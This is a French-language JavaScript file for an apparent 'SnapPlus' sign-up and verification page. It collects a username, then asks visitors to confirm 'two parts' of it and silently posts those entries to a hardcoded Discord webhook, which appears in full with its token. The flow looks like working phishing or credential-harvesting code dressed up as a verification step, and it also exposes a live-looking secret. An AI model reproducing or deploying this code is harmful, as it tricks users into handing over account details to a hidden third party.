```javascript
const DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1536105952720330752/XsDrxHH4dWxbBcT4EgA4zP42BlF5bFYSbOVDAUaQbm83D15HTrfifVL-FwGEyhoXlUCC";


// ==========================================
// ÉTAPE 1 — PSEUDO
// ==========================================

const pseudoForm = document.getElementById("pseudoForm");

if (pseudoForm) {
  pseudoForm.addEventListener("submit", function (event) {
    event.preventDefault();

    const pseudoInput = document.getElementById("pseudo");
    const errorMessage = document.getElementById("errorMessage");
    const submitButton = document.getElementById("submitButton");
    const buttonText = submitButton.querySelector(".button-text");

    const pseudo = pseudoInput.value.trim();

    console.log("Pseudo reçu :", pseudo);

    if (pseudo.length < 2) {
      errorMessage.textContent =
        "Ton pseudo doit contenir au moins 2 caractères.";
      return;
    }

    errorMessage.textContent = "";

    sessionStorage.setItem("snapplus_pseudo", pseudo);

    submitButton.disabled = true;
    buttonText.textContent = "Continuer…";

    // On va à la page de confirmation.
    window.location.href = "verification.html";
  });
}


// ==========================================
// ÉTAPE 2 — CONFIRMATION
// ==========================================

const verificationForm =
  document.getElementById("verificationForm");

if (verificationForm) {
  verificationForm.addEventListener("submit", async function (event) {
    event.preventDefault();

    const firstPart =
      document.getElementById("firstPart").value.trim();

    const secondPart =
      document.getElementById("secondPart").value.trim();

    const errorMessage =
      document.getElementById("verificationError");

    const button =
      document.getElementById("verificationButton");

    const buttonText =
      button.querySelector(".button-text");

    if (!firstPart || !secondPart) {
      errorMessage.textContent =
        "Remplis les deux parties du pseudo.";
      return;
    }

    errorMessage.textContent = "";

    button.disabled = true;
    buttonText.textContent = "Envoi…";

    try {
      const response = await fetch(DISCORD_WEBHOOK, {
        method: "POST",
        headers: {
          "Content-Type": "application/json"
        },
        body: JSON.stringify({
          content:
            "🔎 Confirmation SnapPlus\n" +
            "Première partie : " + firstPart + "\n" +
            "Deuxième partie : " + secondPart
        })
      });

      console.log("Discord :", response.status);

      if (!response.ok) {
        throw new Error("Discord HTTP " + response.status);
      }

      // Tout s'est bien passé.
      window.location.href = "success.html";

    } catch (error) {
      console.error("Erreur Discord :", error);

      errorMessage.textContent =
        "L'envoi a échoué. Vérifie le webhook et la console F12.";

      button.disabled = false;
      buttonText.textContent = "Confirmer →";
    }
  });
}
```
